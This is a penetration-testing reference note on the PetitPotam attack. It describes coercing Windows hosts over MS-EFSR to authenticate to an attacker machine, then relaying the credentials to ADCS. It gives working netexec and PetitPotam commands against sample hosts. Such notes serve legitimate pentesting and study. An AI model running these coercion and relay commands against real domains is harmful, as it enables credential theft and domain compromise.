---
title: NTLM Relay from EFS
---

[[notes/ad/ntlm-relay-source]] as domain user from clients and servers trough [[notes/network/msrpc]] *Encrypting File System Remote Protocol* ([MS-EFSR](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/)).
For systems vulnerable to PetitPotam aka [CVE-2022-26925](https://www.opencve.io/cve/CVE-2022-26925) coercion is possible as unauthenticated user.

The classic PetitPotam attack relays a DC machine account to the [[notes/ad/adcs-esc8|ADCS Web Enrollment endpoint]].

Check if a computer is vulnerable to PetitPotam.

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec smb dc01.corp.local -d corp.local -u jdoe -p 'passw0rd' -M petitpotam
    ~~~

[[notes/ad/ntlm-relay-from-smb|Coerce authentication from SMB]].

=== "[[notes/tools/petitpotam|PetitPotam.py]]"
    ~~~ bash
    ./PetitPotam.py -pipe all -d corp.local -u jdoe -p passw0rd $lhost dc01.corp.local
    ~~~

=== "[[notes/tools/petitpotam|PetitPotam.exe]]"
    ~~~ bat
    .\PetitPotam.exe $lhost dc01.corp.local
    ~~~

[[notes/ad/ntlm-relay-from-webdav|Coerce authentication from WebDAV]].

=== "[[notes/tools/petitpotam|petitpotam.py]]"
    ~~~ bash
    ./PetitPotam.py -pipe all -d corp.local -u jdoe -p passw0rd pentestpc@8080/path ws01.corp.local
    ~~~

=== "[[notes/tools/petitpotam|petitpotam.exe]]"
    ~~~ bat
    .\PetitPotam.exe pentestpc@8080/path ws01.corp.local
    ~~~

This technique is also implemented in [[notes/tools/coercer]].

References:

- [ADCS plus PetitPotam NTLM relay](http://web.archive.org/web/20221006093854/https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate)
- [PetitPotam - NTLM relay to ADCS](https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/)
